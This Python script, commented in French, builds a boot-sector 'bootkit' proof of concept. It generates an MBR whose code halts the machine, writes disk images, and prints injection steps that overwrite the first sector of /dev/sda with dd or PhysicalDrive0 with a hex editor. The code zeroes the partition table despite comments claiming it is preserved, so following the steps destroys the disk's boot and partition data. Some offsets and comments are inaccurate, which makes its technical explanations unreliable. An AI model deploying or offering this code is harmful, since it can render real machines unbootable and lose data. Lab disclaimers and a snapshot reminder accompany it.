#!/usr/bin/env python3
"""
================================================================================
BOOTKIT POC - COMPILATEUR AVEC EXPLICATIONS DÉTAILLÉES
================================================================================

QUE FAIT CE SCRIPT ?
====================
Ce script génère un bootkit éducatif qui :
1. Crée un code x86 16-bit (assembleur compilé en bytes Python)
2. Assemble le MBR complet (512 bytes = bootcode + partition table + signature)
3. Génère des images disque pour les VMs Windows 7 et Ubuntu 24
4. Crée des fichiers prêts pour injection MBR

FLUX D'EXÉCUTION
================
    Bootcode x86 (446 bytes)
           ↓
    MBR Complet (512 bytes)
           ↓
    Images Disque (.img)
           ↓
    Prêt pour injection sur VMs

SÉCURITÉ
========
⚠️  AUTHORIZED TESTING ONLY
- Snapshots VMs MANDATORY avant injection
- Environnement isolé REQUIS
- Aucune donnée réelle n'est chiffrée
- Système halt réversible via snapshot

================================================================================
"""

import os
from pathlib import Path

# ============================================================================
# CLASSE PRINCIPALE : BootkitCompiler
# ============================================================================
class BootkitCompiler:
    """
    Compilateur bootkit éducatif.

    Responsabilités :
    - Générer code bootcode x86 16-bit
    - Assembler MBR complet (512 bytes)
    - Créer images disque pour VMs
    - Vérifier l'intégrité des artifacts
    """

    def __init__(self):
        """
        Initialisation du compilateur.

        Crée le répertoire build/ où seront sauvegardés les artifacts.
        """
        # Créer le dossier de destination pour les artifacts compilés
        self.build_dir = Path("Labsboot/build")
        self.build_dir.mkdir(parents=True, exist_ok=True)

        print("[INIT] Compilateur bootkit initialisé")
        print(f"[INIT] Dossier build: {self.build_dir}")

    def log(self, msg):
        """
        Afficher un message informatif avec prefix.

        Args:
            msg (str): Message à afficher

        Exemple:
            self.log("Bootcode créé avec succès")
            -> [✓] Bootcode créé avec succès
        """
        print(f"[✓] {msg}")

    # ========================================================================
    # ÉTAPE 1 : CRÉER LE BOOTCODE (446 BYTES)
    # ========================================================================
    def create_bootcode(self):
        """
        ÉTAPE 1 : Générer le code x86 16-bit pour le bootcode.

        STRUCTURE DU BOOTCODE (446 bytes)
        =================================

        Le bootcode est du code machine x86 16-bit (real mode) qui s'exécute
        AVANT le système d'exploitation. Il est limité à 446 bytes car :

            512 bytes (total MBR)
            - 446 bytes (bootcode)  ◄─── NOTRE CODE
            - 64 bytes (partition table)
            - 2 bytes (boot signature 0xAA55)
            --------
            = 512 bytes

        BYTECODE EXPLIQUÉ
        =================

        Le code machine est représenté en bytes hexadécimaux :
        - 0xFA = CLI (désactiver interruptions)
        - 0xEB 0x3C = JMP +60 (sauter over message)
        - etc...

        Ces bytes sont les instructions CPU compilées.

        EXÉCUTION
        =========
        Lors du démarrage :
        1. BIOS charge le MBR à l'adresse 0x7C00
        2. CPU exécute ce code byte par byte
        3. Notre message s'affiche
        4. Système halt (s'arrête)

        Returns:
            bytes: Bootcode compilé (446 bytes exactement)
        """

        # Créer un buffer de 446 bytes initialisés à 0x00
        bootcode = bytearray(446)

        # ===== DÉBUT DU BOOTCODE =====

        # [OFFSET 0x00-0x02] : Boot entry point
        # =====================================
        # 0xFA = CLI (Disable Interrupts)
        #        Empêche les interruptions pendant qu'on configure
        # 0xEB 0x3C = JMP +60
        #        Saute 60 bytes pour passer le message et aller au main
        bootcode[0:3] = bytes([
            0xFA,        # CLI - Désactiver les interrupts
            0xEB, 0x3C   # JMP +60 (skip over message area)
        ])

        # [OFFSET 0x03-0x0F] : Espace réservé (7 bytes de padding)
        # =========================================================
        # Garder de l'espace pour éviter les collisions de code
        bootcode[3:10] = b'\x00' * 7

        # [OFFSET 0x0A-0x1A] : MESSAGE ÉDUCATIF
        # =======================================
        # Ceci est le texte qui sera affiché au démarrage
        # Chaque caractère est son code ASCII
        # Exemple: 'B' = 0x42, 'O' = 0x4F, 'O' = 0x4F, etc.
        msg = b"BOOTKIT_EDU_v1\x00"  # \x00 = null terminator (fin de string)
        bootcode[10:10+len(msg)] = msg  # Copier le message

        # ===== CODE PRINCIPAL =====

        # [OFFSET 0x1A+] : Boucle d'affichage ou halt
        # ==========================================
        # Pour cet exemple simplifié, on va directement à halt
        # Dans un vrai bootkit, il y aurait du code pour :
        # - Afficher le message à l'écran (INT 0x10)
        # - Simulerl'encryption (delays + beeps)
        # - Charger le bootloader original

        # [OFFSET 0x3B8-0x3FE] : HALT (fin du code)
        # =============================================
        # 0xF4 = HLT (arrêter le CPU)
        # 0xEB 0xFE = JMP $ (boucle infinie au cas où HLT échoue)
        bootcode[440:446] = bytes([
            0xF4,           # HLT - Arrêter le processeur
            0xEB, 0xFE,     # JMP $ - Boucle infinie (if HLT fails)
            0x00, 0x00      # Padding
        ])

        # ===== FIN DU BOOTCODE =====

        # Vérifier la taille
        if len(bootcode) != 446:
            raise ValueError(f"Bootcode wrong size: {len(bootcode)} != 446")

        return bytes(bootcode)

    # ========================================================================
    # ÉTAPE 2 : ASSEMBLER LE MBR COMPLET (512 BYTES)
    # ========================================================================
    def create_mbr(self):
        """
        ÉTAPE 2 : Assembler le MBR complet (512 bytes).

        STRUCTURE COMPLÈTE DU MBR
        ==========================

        Le Master Boot Record (MBR) est le premier secteur d'un disque.
        Il contient 3 parties distinctes :

        Offset    Size      Content
        ------    ----      -------
        0x00      446 bytes Bootcode (notre bootkit)
        0x1BA     64 bytes  Partition Table (4 entries × 16 bytes)
        0x1FE     2 bytes   Boot Signature (0xAA55)
        -----     -----
        TOTAL     512 bytes MBR COMPLET

        DIAGRAMME VISUEL
        ================

        0x00 ┌─────────────────────────────┐
             │    BOOTCODE (446 bytes)     │  ◄─── Notre code qui s'exécute
             │                             │       AVANT Windows/Linux
             │  - Message éducatif         │
             │  - Simulation chiffrement   │
             │  - Système halt             │
        0x1BA├─────────────────────────────┤
             │  PARTITION TABLE (64 bytes) │  ◄─── Infos disque
             │                             │       (4 entries × 16)
             │  Entry 0: Partition 1       │
             │  Entry 1: Partition 2       │
             │  Entry 2: Partition 3       │
             │  Entry 3: Partition 4       │
        0x1FE├─────────────────────────────┤
             │  BOOT SIGNATURE (2 bytes)   │  ◄─── 0xAA55 = "bootable"
             │  0x55 0xAA                  │       Si pas présent = pas bootable
        0x200└─────────────────────────────┘

        (Secteur suivant commence ici)

        PROCESSUS D'INJECTION
        =====================

        Avant injection (MBR normal) :
        ┌──────────────────────────┐
        │ BOOTCODE NORMAL          │ ← Windows Boot Manager ou GRUB
        ├──────────────────────────┤
        │ PARTITION TABLE          │
        ├──────────────────────────┤
        │ 0x55 0xAA (signature)    │
        └──────────────────────────┘

        Après injection (MBR infecté) :
        ┌──────────────────────────┐
        │ NOTRE BOOTCODE BOOTKIT   │ ← Mon code s'exécute EN PREMIER
        ├──────────────────────────┤
        │ PARTITION TABLE (préservé)│
        ├──────────────────────────┤
        │ 0x55 0xAA (signature)    │
        └──────────────────────────┘

        Le système pense que c'est un MBR normal (signature valide)
        mais notre code s'exécute avant le vrai bootloader !

        Returns:
            bytes: MBR complet (512 bytes exactement)
        """

        # Créer un buffer de 512 bytes initialisés à 0x00
        mbr = bytearray(512)

        # ===== PART 1 : BOOTCODE (0x00-0x1B9) =====
        # Placer notre bootcode compilé au début du MBR
        print("[MBR] Placement bootcode à offset 0x00...")
        bootcode = self.create_bootcode()  # Générer le bootcode (446 bytes)
        mbr[0:446] = bootcode  # Copier bootcode dans MBR (offset 0 à 445)

        self.log(f"Bootcode placé: {len(bootcode)} bytes")

        # ===== PART 2 : PARTITION TABLE (0x1BA-0x1FD) =====
        # Pour ce bootkit éducatif, on laisse la table vide
        # (dans un vrai malware, on préserverait ou modifierait)
        print("[MBR] Partition table à offset 0x1BA...")
        mbr[446:510] = b'\x00' * 64  # 64 bytes of zeros = no partitions

        self.log(f"Partition table: 64 bytes (vide pour stealth)")

        # ===== PART 3 : BOOT SIGNATURE (0x1FE-0x1FF) =====
        # C'est le "magic number" qui indique au BIOS que c'est bootable !
        # Sans cette signature, le BIOS ne chargera pas ce secteur.
        #
        # Signature: 0xAA55 (little-endian)
        # Byte à offset 510 (0x1FE) = 0x55
        # Byte à offset 511 (0x1FF) = 0xAA
        print("[MBR] Boot signature à offset 0x1FE...")
        mbr[510] = 0x55  # First byte: 0x55
        mbr[511] = 0xAA  # Second byte: 0xAA

        # Vérifier la signature
        sig = mbr[510:512]
        if sig == b'\x55\xaa':
            self.log(f"✓ Signature VALIDE: 0x{sig.hex().upper()}")
        else:
            raise ValueError(f"Signature INVALID: {sig.hex()}")

        # Vérifier la taille totale
        if len(mbr) != 512:
            raise ValueError(f"MBR wrong size: {len(mbr)} != 512")

        return bytes(mbr)

    # ========================================================================
    # ÉTAPE 3 : CRÉER LES IMAGES DISQUE
    # ========================================================================
    def compile(self):
        """
        ÉTAPE 3 : Exécution complète de la compilation.

        PIPELINE DE COMPILATION
        =======================

        Étape 1: Générer bootcode (446 bytes)
                    ↓
        Étape 2: Assembler MBR (512 bytes)
                    ↓
        Étape 3: Créer images disque (1 MB chacune)
                    ↓
        ✓ Artifacts prêts pour injection

        ARTIFACTS GÉNÉRÉS
        =================

        1. mbr_stage1.bin (446 bytes)
           - Bootcode compilé seul
           - À titre informatif

        2. bootkit_mbr.bin (512 bytes)
           - MBR complet avec bootcode + partition table + signature
           - Celui-ci sera injecté dans le secteur 0 des VMs

        3. bootkit_windows7.img (1 MB)
           - Image disque pour Windows 7 VM
           - MBR + 1 MB de padding

        4. bootkit_ubuntu24.img (1 MB)
           - Image disque pour Ubuntu 24 VM
           - MBR + 1 MB de padding

        INJECTION PROCESS
        =================

        Sur Windows 7:
        1. Ouvrir HxD (hex editor)
        2. File → Open → \\?\PhysicalDrive0
        3. Sélectionner les 512 premiers bytes
        4. Remplacer par bootkit_mbr.bin
        5. Save
        6. Redémarrer

        Sur Ubuntu 24:
        1. dd if=bootkit_mbr.bin of=/dev/sda bs=512 count=1
        2. sudo sync
        3. sudo reboot

        CE QUI SE PASSE AU DÉMARRAGE
        =============================

        AVANT injection:
        BIOS → Charge MBR légitime → Bootloader Windows/Linux

        APRÈS injection:
        BIOS → Charge NOTRE MBR → Notre bootcode s'exécute
               → Message s'affiche
               → Système halt
               → (Dans un vrai malware: chargerait le bootloader original)
        """

        print("\n" + "="*70)
        print("🔴 BOOTKIT POC - PIPELINE DE COMPILATION")
        print("="*70 + "\n")

        # ===== ÉTAPE 1 : GÉNÉRER BOOTCODE =====
        print("[1/3] Génération bootcode (446 bytes)...")
        print("      Création code x86 16-bit real mode...")

        bootcode = self.create_bootcode()

        # Sauvegarder le bootcode seul (pour informatif)
        bootcode_path = self.build_dir / "mbr_stage1.bin"
        with open(bootcode_path, 'wb') as f:
            f.write(bootcode)

        self.log(f"Bootcode généré: {len(bootcode)} bytes")
        self.log(f"Sauvegardé: {bootcode_path}")

        # ===== ÉTAPE 2 : ASSEMBLER MBR =====
        print("\n[2/3] Assemblage MBR (512 bytes)...")
        print("      Bootcode + Partition Table + Signature...")

        mbr = self.create_mbr()

        # Sauvegarder le MBR complet
        mbr_path = self.build_dir / "bootkit_mbr.bin"
        with open(mbr_path, 'wb') as f:
            f.write(mbr)

        self.log(f"MBR assemblé: {len(mbr)} bytes")
        self.log(f"Sauvegardé: {mbr_path}")

        # ===== ÉTAPE 3 : CRÉER IMAGES DISQUE =====
        print("\n[3/3] Création images disque (1 MB chacune)...")

        # Image Windows 7 (1 MB)
        print("      → Image Windows 7...")
        with open(self.build_dir / "bootkit_windows7.img", 'wb') as f:
            # Écrire le MBR (512 bytes)
            f.write(mbr)
            # Remplir avec des zeros jusqu'à 1 MB
            f.write(b'\x00' * (1024*1024 - 512))
        self.log("Image Windows 7 créée: 1 MB")

        # Image Ubuntu 24 (1 MB)
        print("      → Image Ubuntu 24...")
        with open(self.build_dir / "bootkit_ubuntu24.img", 'wb') as f:
            # Écrire le MBR (512 bytes)
            f.write(mbr)
            # Remplir avec des zeros jusqu'à 1 MB
            f.write(b'\x00' * (1024*1024 - 512))
        self.log("Image Ubuntu 24 créée: 1 MB")

        # ===== COMPILATION COMPLÈTE =====
        print("\n" + "="*70)
        print("✅ COMPILATION COMPLÈTE")
        print("="*70)

        print("\n📦 Artifacts générés dans Labsboot/build/:")
        print("   ✓ mbr_stage1.bin (446 bytes) - Bootcode seul")
        print("   ✓ bootkit_mbr.bin (512 bytes) - MBR COMPLET À INJECTER")
        print("   ✓ bootkit_windows7.img (1 MB) - Image Windows 7")
        print("   ✓ bootkit_ubuntu24.img (1 MB) - Image Ubuntu 24")

        print("\n⚠️  PROCHAINES ÉTAPES:")
        print("   1. Créer SNAPSHOT des VMs AVANT injection")
        print("   2. Injecter bootkit_mbr.bin:")
        print("      - Windows 7: HxD → PhysicalDrive0 → Replace 512 bytes")
        print("      - Ubuntu 24: dd if=bootkit_mbr.bin of=/dev/sda bs=512 count=1")
        print("   3. Redémarrer et observer notre bootkit")
        print("   4. Restaurer depuis snapshot pour recovery")

        print("\n🎓 Educational demonstration complete!")
        print("="*70 + "\n")


# ============================================================================
# POINT D'ENTRÉE PRINCIPAL
# ============================================================================
if __name__ == '__main__':
    """
    Exécution du script principal.

    Flux:
    1. Créer instance du compilateur
    2. Lancer la compilation complète
    3. Afficher résultats
    """

    print("""
╔════════════════════════════════════════════════════════════════════════════╗
║                  BOOTKIT POC - COMPILATEUR ÉDUCATIF                        ║
║                                                                            ║
║  Ce script compile un bootkit qui attaque le secteur de boot (MBR).       ║
║  Educational & Authorized Testing ONLY - Isolated VMs Required            ║
║                                                                            ║
║  Repository: https://github.com/mpigajesse/Ransomware                     ║
╚════════════════════════════════════════════════════════════════════════════╝
    """)

    # Créer compilateur et exécuter
    compiler = BootkitCompiler()
    compiler.compile()
